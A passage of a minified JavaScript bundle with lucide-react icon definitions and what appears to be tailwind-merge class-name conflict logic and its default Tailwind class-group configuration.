 * See the LICENSE file in the root directory of this source tree.
 */ const xx = D("Menu", [
    ["line", { x1: "4", x2: "20", y1: "12", y2: "12", key: "1e0a9i" }],
    ["line", { x1: "4", x2: "20", y1: "6", y2: "6", key: "1owob3" }],
    ["line", { x1: "4", x2: "20", y1: "18", y2: "18", key: "yk5zj1" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const wx = D("MonitorSmartphone", [
    ["path", { d: "M18 8V6a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2v7a2 2 0 0 0 2 2h8", key: "10dyio" }],
    ["path", { d: "M10 19v-3.96 3.15", key: "1irgej" }],
    ["path", { d: "M7 19h5", key: "qswx4l" }],
    ["rect", { width: "6", height: "10", x: "16", y: "12", rx: "2", key: "1egngj" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const si = D("Monitor", [
    ["rect", { width: "20", height: "14", x: "2", y: "3", rx: "2", key: "48i651" }],
    ["line", { x1: "8", x2: "16", y1: "21", y2: "21", key: "1svkeh" }],
    ["line", { x1: "12", x2: "12", y1: "17", y2: "21", key: "vw1qmm" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Sx = D("Moon", [["path", { d: "M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z", key: "a7tn18" }]]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Jr = D("Network", [
    ["rect", { x: "16", y: "16", width: "6", height: "6", rx: "1", key: "4q2zg0" }],
    ["rect", { x: "2", y: "16", width: "6", height: "6", rx: "1", key: "8cvhb9" }],
    ["rect", { x: "9", y: "2", width: "6", height: "6", rx: "1", key: "1egb70" }],
    ["path", { d: "M5 16v-3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v3", key: "1jsf9p" }],
    ["path", { d: "M12 12V8", key: "2874zd" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const bx = D("Package", [
    [
        "path",
        {
            d: "M11 21.73a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73z",
            key: "1a0edw",
        },
    ],
    ["path", { d: "M12 22V12", key: "d0xqtd" }],
    ["path", { d: "m3.3 7 7.703 4.734a2 2 0 0 0 1.994 0L20.7 7", key: "yx3hmr" }],
    ["path", { d: "m7.5 4.27 9 5.15", key: "1c824w" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const kx = D("Paperclip", [
    [
        "path",
        {
            d: "m21.44 11.05-9.19 9.19a6 6 0 0 1-8.49-8.49l8.57-8.57A4 4 0 1 1 18 8.84l-8.59 8.57a2 2 0 0 1-2.83-2.83l8.49-8.48",
            key: "1u3ebp",
        },
    ],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Cx = D("Play", [["polygon", { points: "6 3 20 12 6 21 6 3", key: "1oa8hb" }]]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const ps = D("Power", [
    ["path", { d: "M12 2v10", key: "mnfbl" }],
    ["path", { d: "M18.4 6.6a9 9 0 1 1-12.77.04", key: "obofu9" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const vg = D("Radio", [
    ["path", { d: "M4.9 19.1C1 15.2 1 8.8 4.9 4.9", key: "1vaf9d" }],
    ["path", { d: "M7.8 16.2c-2.3-2.3-2.3-6.1 0-8.5", key: "u1ii0m" }],
    ["circle", { cx: "12", cy: "12", r: "2", key: "1c9p78" }],
    ["path", { d: "M16.2 7.8c2.3 2.3 2.3 6.1 0 8.5", key: "1j5fej" }],
    ["path", { d: "M19.1 4.9C23 8.8 23 15.1 19.1 19", key: "10b0cb" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Rp = D("RefreshCw", [
    ["path", { d: "M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8", key: "v9h5vc" }],
    ["path", { d: "M21 3v5h-5", key: "1q7to0" }],
    ["path", { d: "M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16", key: "3uifl3" }],
    ["path", { d: "M8 16H3v5", key: "1cv678" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Px = D("Scan", [
    ["path", { d: "M3 7V5a2 2 0 0 1 2-2h2", key: "aa7l1z" }],
    ["path", { d: "M17 3h2a2 2 0 0 1 2 2v2", key: "4qcy5o" }],
    ["path", { d: "M21 17v2a2 2 0 0 1-2 2h-2", key: "6vwrx8" }],
    ["path", { d: "M7 21H5a2 2 0 0 1-2-2v-2", key: "ioqczr" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const br = D("Search", [
    ["circle", { cx: "11", cy: "11", r: "8", key: "4ej97u" }],
    ["path", { d: "m21 21-4.3-4.3", key: "1qie3q" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Ex = D("Send", [
    [
        "path",
        {
            d: "M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z",
            key: "1ffxy3",
        },
    ],
    ["path", { d: "m21.854 2.147-10.94 10.939", key: "12cjpa" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const xg = D("Server", [
    ["rect", { width: "20", height: "8", x: "2", y: "2", rx: "2", ry: "2", key: "ngkwjq" }],
    ["rect", { width: "20", height: "8", x: "2", y: "14", rx: "2", ry: "2", key: "iecqi9" }],
    ["line", { x1: "6", x2: "6.01", y1: "6", y2: "6", key: "16zg32" }],
    ["line", { x1: "6", x2: "6.01", y1: "18", y2: "18", key: "nzw8ys" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Nx = D("Settings", [
    [
        "path",
        {
            d: "M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z",
            key: "1qme2f",
        },
    ],
    ["circle", { cx: "12", cy: "12", r: "3", key: "1v7zrd" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Tr = D("Shield", [
    [
        "path",
        {
            d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",
            key: "oel41y",
        },
    ],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Tx = D("Skull", [
    ["path", { d: "m12.5 17-.5-1-.5 1h1z", key: "3me087" }],
    [
        "path",
        {
            d: "M15 22a1 1 0 0 0 1-1v-1a2 2 0 0 0 1.56-3.25 8 8 0 1 0-11.12 0A2 2 0 0 0 8 20v1a1 1 0 0 0 1 1z",
            key: "1o5pge",
        },
    ],
    ["circle", { cx: "15", cy: "12", r: "1", key: "1tmaij" }],
    ["circle", { cx: "9", cy: "12", r: "1", key: "1vctgf" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Ku = D("Smartphone", [
    ["rect", { width: "14", height: "20", x: "5", y: "2", rx: "2", ry: "2", key: "1yt0o3" }],
    ["path", { d: "M12 18h.01", key: "mhygvu" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Mp = D("SquarePen", [
    ["path", { d: "M12 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7", key: "1m0v6g" }],
    [
        "path",
        {
            d: "M18.375 2.625a1 1 0 0 1 3 3l-9.013 9.014a2 2 0 0 1-.853.505l-2.873.84a.5.5 0 0 1-.62-.62l.84-2.873a2 2 0 0 1 .506-.852z",
            key: "ohrbg2",
        },
    ],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Ax = D("Sun", [
    ["circle", { cx: "12", cy: "12", r: "4", key: "4exip2" }],
    ["path", { d: "M12 2v2", key: "tus03m" }],
    ["path", { d: "M12 20v2", key: "1lh1kg" }],
    ["path", { d: "m4.93 4.93 1.41 1.41", key: "149t6j" }],
    ["path", { d: "m17.66 17.66 1.41 1.41", key: "ptbguv" }],
    ["path", { d: "M2 12h2", key: "1t8f8n" }],
    ["path", { d: "M20 12h2", key: "1q8mjw" }],
    ["path", { d: "m6.34 17.66-1.41 1.41", key: "1m8zz5" }],
    ["path", { d: "m19.07 4.93-1.41 1.41", key: "1shlcs" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const jx = D("TabletSmartphone", [
    ["rect", { width: "10", height: "14", x: "3", y: "8", rx: "2", key: "1vrsiq" }],
    ["path", { d: "M5 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v16a2 2 0 0 1-2 2h-2.4", key: "1j4zmg" }],
    ["path", { d: "M8 18h.01", key: "lrp35t" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const wg = D("Target", [
    ["circle", { cx: "12", cy: "12", r: "10", key: "1mglay" }],
    ["circle", { cx: "12", cy: "12", r: "6", key: "1vlfrh" }],
    ["circle", { cx: "12", cy: "12", r: "2", key: "1c9p78" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Ar = D("Terminal", [
    ["polyline", { points: "4 17 10 11 4 5", key: "akl6gq" }],
    ["line", { x1: "12", x2: "20", y1: "19", y2: "19", key: "q2wloq" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Pl = D("Trash2", [
    ["path", { d: "M3 6h18", key: "d0wm0j" }],
    ["path", { d: "M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6", key: "4alrt4" }],
    ["path", { d: "M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2", key: "v07s0e" }],
    ["line", { x1: "10", x2: "10", y1: "11", y2: "17", key: "1uufr5" }],
    ["line", { x1: "14", x2: "14", y1: "11", y2: "17", key: "xtxkd" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Rx = D("TriangleAlert", [
    ["path", { d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3", key: "wmoenq" }],
    ["path", { d: "M12 9v4", key: "juzpu7" }],
    ["path", { d: "M12 17h.01", key: "p32p05" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Sg = D("Upload", [
    ["path", { d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4", key: "ih7n3h" }],
    ["polyline", { points: "17 8 12 3 7 8", key: "t8dd8p" }],
    ["line", { x1: "12", x2: "12", y1: "3", y2: "15", key: "widbto" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const bg = D("Usb", [
    ["circle", { cx: "10", cy: "7", r: "1", key: "dypaad" }],
    ["circle", { cx: "4", cy: "20", r: "1", key: "22iqad" }],
    ["path", { d: "M4.7 19.3 19 5", key: "1enqfc" }],
    ["path", { d: "m21 3-3 1 2 2Z", key: "d3ov82" }],
    ["path", { d: "M9.26 7.68 5 12l2 5", key: "1esawj" }],
    ["path", { d: "m10 14 5 2 3.5-3.5", key: "v8oal5" }],
    ["path", { d: "m18 12 1-1 1 1-1 1Z", key: "1bh22v" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Mx = D("UserX", [
    ["path", { d: "M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2", key: "1yyitq" }],
    ["circle", { cx: "9", cy: "7", r: "4", key: "nufk8" }],
    ["line", { x1: "17", x2: "22", y1: "8", y2: "13", key: "3nzzx3" }],
    ["line", { x1: "22", x2: "17", y1: "8", y2: "13", key: "1swrse" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Mc = D("User", [
    ["path", { d: "M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2", key: "975kel" }],
    ["circle", { cx: "12", cy: "7", r: "4", key: "17ys0d" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const kg = D("Users", [
    ["path", { d: "M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2", key: "1yyitq" }],
    ["circle", { cx: "9", cy: "7", r: "4", key: "nufk8" }],
    ["path", { d: "M22 21v-2a4 4 0 0 0-3-3.87", key: "kshegd" }],
    ["path", { d: "M16 3.13a4 4 0 0 1 0 7.75", key: "1da9ce" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Ix = D("Wifi", [
    ["path", { d: "M12 20h.01", key: "zekei9" }],
    ["path", { d: "M2 8.82a15 15 0 0 1 20 0", key: "dnpr2z" }],
    ["path", { d: "M5 12.859a10 10 0 0 1 14 0", key: "1x1e6c" }],
    ["path", { d: "M8.5 16.429a5 5 0 0 1 7 0", key: "1bycff" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Cg = D("Wrench", [
    [
        "path",
        {
            d: "M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z",
            key: "cbrjhi",
        },
    ],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const la = D("X", [
    ["path", { d: "M18 6 6 18", key: "1bl5f8" }],
    ["path", { d: "m6 6 12 12", key: "d8bk6v" }],
]);
/**
 * @license lucide-react v0.462.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */ const Gu = D("Zap", [
        [
            "path",
            {
                d: "M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z",
                key: "1xq2db",
            },
        ],
    ]),
    Qu = "-",
    Lx = (e) => {
        const t = Ox(e),
            { conflictingClassGroups: n, conflictingClassGroupModifiers: r } = e;
        return {
            getClassGroupId: (s) => {
                const a = s.split(Qu);
                return a[0] === "" && a.length !== 1 && a.shift(), Pg(a, t) || Dx(s);
            },
            getConflictingClassGroupIds: (s, a) => {
                const c = n[s] || [];
                return a && r[s] ? [...c, ...r[s]] : c;
            },
        };
    },
    Pg = (e, t) => {
        var s;
        if (e.length === 0) return t.classGroupId;
        const n = e[0],
            r = t.nextPart.get(n),
            o = r ? Pg(e.slice(1), r) : void 0;
        if (o) return o;
        if (t.validators.length === 0) return;
        const i = e.join(Qu);
        return (s = t.validators.find(({ validator: a }) => a(i))) == null ? void 0 : s.classGroupId;
    },
    Ip = /^\[(.+)\]$/,
    Dx = (e) => {
        if (Ip.test(e)) {
            const t = Ip.exec(e)[1],
                n = t == null ? void 0 : t.substring(0, t.indexOf(":"));
            if (n) return "arbitrary.." + n;
        }
    },
    Ox = (e) => {
        const { theme: t, prefix: n } = e,
            r = { nextPart: new Map(), validators: [] };
        return (
            Fx(Object.entries(e.classGroups), n).forEach(([i, s]) => {
                Ic(s, r, i, t);
            }),
            r
        );
    },
    Ic = (e, t, n, r) => {
        e.forEach((o) => {
            if (typeof o == "string") {
                const i = o === "" ? t : Lp(t, o);
                i.classGroupId = n;
                return;
            }
            if (typeof o == "function") {
                if (_x(o)) {
                    Ic(o(r), t, n, r);
                    return;
                }
                t.validators.push({ validator: o, classGroupId: n });
                return;
            }
            Object.entries(o).forEach(([i, s]) => {
                Ic(s, Lp(t, i), n, r);
            });
        });
    },
    Lp = (e, t) => {
        let n = e;
        return (
            t.split(Qu).forEach((r) => {
                n.nextPart.has(r) || n.nextPart.set(r, { nextPart: new Map(), validators: [] }),
                    (n = n.nextPart.get(r));
            }),
            n
        );
    },
    _x = (e) => e.isThemeGetter,
    Fx = (e, t) =>
        t
            ? e.map(([n, r]) => {
                  const o = r.map((i) =>
                      typeof i == "string"
                          ? t + i
                          : typeof i == "object"
                            ? Object.fromEntries(Object.entries(i).map(([s, a]) => [t + s, a]))
                            : i
                  );
                  return [n, o];
              })
            : e,
    zx = (e) => {
        if (e < 1) return { get: () => {}, set: () => {} };
        let t = 0,
            n = new Map(),
            r = new Map();
        const o = (i, s) => {
            n.set(i, s), t++, t > e && ((t = 0), (r = n), (n = new Map()));
        };
        return {
            get(i) {
                let s = n.get(i);
                if (s !== void 0) return s;
                if ((s = r.get(i)) !== void 0) return o(i, s), s;
            },
            set(i, s) {
                n.has(i) ? n.set(i, s) : o(i, s);
            },
        };
    },
    Eg = "!",
    Bx = (e) => {
        const { separator: t, experimentalParseClassName: n } = e,
            r = t.length === 1,
            o = t[0],
            i = t.length,
            s = (a) => {
                const c = [];
                let u = 0,
                    d = 0,
                    p;
                for (let w = 0; w < a.length; w++) {
                    let g = a[w];
                    if (u === 0) {
                        if (g === o && (r || a.slice(w, w + i) === t)) {
                            c.push(a.slice(d, w)), (d = w + i);
                            continue;
                        }
                        if (g === "/") {
                            p = w;
                            continue;
                        }
                    }
                    g === "[" ? u++ : g === "]" && u--;
                }
                const m = c.length === 0 ? a : a.substring(d),
                    f = m.startsWith(Eg),
                    S = f ? m.substring(1) : m,
                    y = p && p > d ? p - d : void 0;
                return { modifiers: c, hasImportantModifier: f, baseClassName: S, maybePostfixModifierPosition: y };
            };
        return n ? (a) => n({ className: a, parseClassName: s }) : s;
    },
    Ux = (e) => {
        if (e.length <= 1) return e;
        const t = [];
        let n = [];
        return (
            e.forEach((r) => {
                r[0] === "[" ? (t.push(...n.sort(), r), (n = [])) : n.push(r);
            }),
            t.push(...n.sort()),
            t
        );
    },
    Hx = (e) => ({ cache: zx(e.cacheSize), parseClassName: Bx(e), ...Lx(e) }),
    $x = /\s+/,
    Vx = (e, t) => {
        const { parseClassName: n, getClassGroupId: r, getConflictingClassGroupIds: o } = t,
            i = [],
            s = e.trim().split($x);
        let a = "";
        for (let c = s.length - 1; c >= 0; c -= 1) {
            const u = s[c],
                { modifiers: d, hasImportantModifier: p, baseClassName: m, maybePostfixModifierPosition: f } = n(u);
            let S = !!f,
                y = r(S ? m.substring(0, f) : m);
            if (!y) {
                if (!S) {
                    a = u + (a.length > 0 ? " " + a : a);
                    continue;
                }
                if (((y = r(m)), !y)) {
                    a = u + (a.length > 0 ? " " + a : a);
                    continue;
                }
                S = !1;
            }
            const w = Ux(d).join(":"),
                g = p ? w + Eg : w,
                h = g + y;
            if (i.includes(h)) continue;
            i.push(h);
            const v = o(y, S);
            for (let b = 0; b < v.length; ++b) {
                const k = v[b];
                i.push(g + k);
            }
            a = u + (a.length > 0 ? " " + a : a);
        }
        return a;
    };
function Wx() {
    let e = 0,
        t,
        n,
        r = "";
    for (; e < arguments.length; ) (t = arguments[e++]) && (n = Ng(t)) && (r && (r += " "), (r += n));
    return r;
}
const Ng = (e) => {
    if (typeof e == "string") return e;
    let t,
        n = "";
    for (let r = 0; r < e.length; r++) e[r] && (t = Ng(e[r])) && (n && (n += " "), (n += t));
    return n;
};
function Kx(e, ...t) {
    let n,
        r,
        o,
        i = s;
    function s(c) {
        const u = t.reduce((d, p) => p(d), e());
        return (n = Hx(u)), (r = n.cache.get), (o = n.cache.set), (i = a), a(c);
    }
    function a(c) {
        const u = r(c);
        if (u) return u;
        const d = Vx(c, n);
        return o(c, d), d;
    }
    return function () {
        return i(Wx.apply(null, arguments));
    };
}
const ae = (e) => {
        const t = (n) => n[e] || [];
        return (t.isThemeGetter = !0), t;
    },
    Tg = /^\[(?:([a-z-]+):)?(.+)\]$/i,
    Gx = /^\d+\/\d+$/,
    Qx = new Set(["px", "full", "screen"]),
    qx = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,
    Xx =
        /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,
    Yx = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/,
    Zx = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,
    Jx = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/,
    rn = (e) => so(e) || Qx.has(e) || Gx.test(e),
    Tn = (e) => Ao(e, "length", aw),
    so = (e) => !!e && !Number.isNaN(Number(e)),
    El = (e) => Ao(e, "number", so),
    $o = (e) => !!e && Number.isInteger(Number(e)),
    ew = (e) => e.endsWith("%") && so(e.slice(0, -1)),
    Q = (e) => Tg.test(e),
    An = (e) => qx.test(e),
    tw = new Set(["length", "size", "percentage"]),
    nw = (e) => Ao(e, tw, Ag),
    rw = (e) => Ao(e, "position", Ag),
    ow = new Set(["image", "url"]),
    iw = (e) => Ao(e, ow, cw),
    sw = (e) => Ao(e, "", lw),
    Vo = () => !0,
    Ao = (e, t, n) => {
        const r = Tg.exec(e);
        return r ? (r[1] ? (typeof t == "string" ? r[1] === t : t.has(r[1])) : n(r[2])) : !1;
    },
    aw = (e) => Xx.test(e) && !Yx.test(e),
    Ag = () => !1,
    lw = (e) => Zx.test(e),
    cw = (e) => Jx.test(e),
    uw = () => {
        const e = ae("colors"),
            t = ae("spacing"),
            n = ae("blur"),
            r = ae("brightness"),
            o = ae("borderColor"),
            i = ae("borderRadius"),
            s = ae("borderSpacing"),
            a = ae("borderWidth"),
            c = ae("contrast"),
            u = ae("grayscale"),
            d = ae("hueRotate"),
            p = ae("invert"),
            m = ae("gap"),
            f = ae("gradientColorStops"),
            S = ae("gradientColorStopPositions"),
            y = ae("inset"),
            w = ae("margin"),
            g = ae("opacity"),
            h = ae("padding"),
            v = ae("saturate"),
            b = ae("scale"),
            k = ae("sepia"),
            C = ae("skew"),
            P = ae("space"),
            A = ae("translate"),
            L = () => ["auto", "contain", "none"],
            M = () => ["auto", "hidden", "clip", "visible", "scroll"],
            U = () => ["auto", Q, t],
            F = () => [Q, t],
            G = () => ["", rn, Tn],
            O = () => ["auto", so, Q],
            X = () => [
                "bottom",
                "center",
                "left",
                "left-bottom",
                "left-top",
                "right",
                "right-bottom",
                "right-top",
                "top",
            ],
            H = () => ["solid", "dashed", "dotted", "double", "none"],
            $ = () => [
                "normal",
                "multiply",
                "screen",
                "overlay",
                "darken",
                "lighten",
                "color-dodge",
                "color-burn",
                "hard-light",
                "soft-light",
                "difference",
                "exclusion",
                "hue",
                "saturation",
                "color",
                "luminosity",
            ],
            E = () => ["start", "end", "center", "between", "around", "evenly", "stretch"],
            T = () => ["", "0", Q],
            _ = () => ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"],
            V = () => [so, Q];
        return {
            cacheSize: 500,
            separator: ":",
            theme: {
                colors: [Vo],
                spacing: [rn, Tn],
                blur: ["none", "", An, Q],
                brightness: V(),
                borderColor: [e],
                borderRadius: ["none", "", "full", An, Q],
                borderSpacing: F(),
                borderWidth: G(),
                contrast: V(),
                grayscale: T(),
                hueRotate: V(),
                invert: T(),
                gap: F(),
                gradientColorStops: [e],
                gradientColorStopPositions: [ew, Tn],
                inset: U(),
                margin: U(),
                opacity: V(),
                padding: F(),
                saturate: V(),
                scale: V(),
                sepia: T(),
                skew: V(),
                space: F(),
                translate: F(),
            },
            classGroups: {
                aspect: [{ aspect: ["auto", "square", "video", Q] }],
                container: ["container"],
                columns: [{ columns: [An] }],
                "break-after": [{ "break-after": _() }],
                "break-before": [{ "break-before": _() }],
                "break-inside": [{ "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"] }],
                "box-decoration": [{ "box-decoration": ["slice", "clone"] }],
                box: [{ box: ["border", "content"] }],
                display: [
                    "block",
                    "inline-block",
                    "inline",
                    "flex",
                    "inline-flex",
                    "table",
                    "inline-table",
                    "table-caption",
                    "table-cell",
                    "table-column",
                    "table-column-group",
                    "table-footer-group",
                    "table-header-group",
                    "table-row-group",
                    "table-row",
                    "flow-root",
                    "grid",
                    "inline-grid",
                    "contents",
                    "list-item",
                    "hidden",
                ],
                float: [{ float: ["right", "left", "none", "start", "end"] }],
                clear: [{ clear: ["left", "right", "both", "none", "start", "end"] }],
                isolation: ["isolate", "isolation-auto"],
                "object-fit": [{ object: ["contain", "cover", "fill", "none", "scale-down"] }],
                "object-position": [{ object: [...X(), Q] }],
                overflow: [{ overflow: M() }],
                "overflow-x": [{ "overflow-x": M() }],
                "overflow-y": [{ "overflow-y": M() }],
                overscroll: [{ overscroll: L() }],
                "overscroll-x": [{ "overscroll-x": L() }],
                "overscroll-y": [{ "overscroll-y": L() }],
                position: ["static", "fixed", "absolute", "relative", "sticky"],
                inset: [{ inset: [y] }],
                "inset-x": [{ "inset-x": [y] }],
                "inset-y": [{ "inset-y": [y] }],
                start: [{ start: [y] }],
                end: [{ end: [y] }],
                top: [{ top: [y] }],
                right: [{ right: [y] }],
                bottom: [{ bottom: [y] }],
                left: [{ left: [y] }],
                visibility: ["visible", "invisible", "collapse"],
                z: [{ z: ["auto", $o, Q] }],
                basis: [{ basis: U() }],
                "flex-direction": [{ flex: ["row", "row-reverse", "col", "col-reverse"] }],
                "flex-wrap": [{ flex: ["wrap", "wrap-reverse", "nowrap"] }],
                flex: [{ flex: ["1", "auto", "initial", "none", Q] }],
                grow: [{ grow: T() }],
                shrink: [{ shrink: T() }],
                order: [{ order: ["first", "last", "none", $o, Q] }],
                "grid-cols": [{ "grid-cols": [Vo] }],
                "col-start-end": [{ col: ["auto", { span: ["full", $o, Q] }, Q] }],
                "col-start": [{ "col-start": O() }],
                "col-end": [{ "col-end": O() }],
                "grid-rows": [{ "grid-rows": [Vo] }],
                "row-start-end": [{ row: ["auto", { span: [$o, Q] }, Q] }],
                "row-start": [{ "row-start": O() }],
                "row-end": [{ "row-end": O() }],
                "grid-flow": [{ "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"] }],
                "auto-cols": [{ "auto-cols": ["auto", "min", "max", "fr", Q] }],
                "auto-rows": [{ "auto-rows": ["auto", "min", "max", "fr", Q] }],
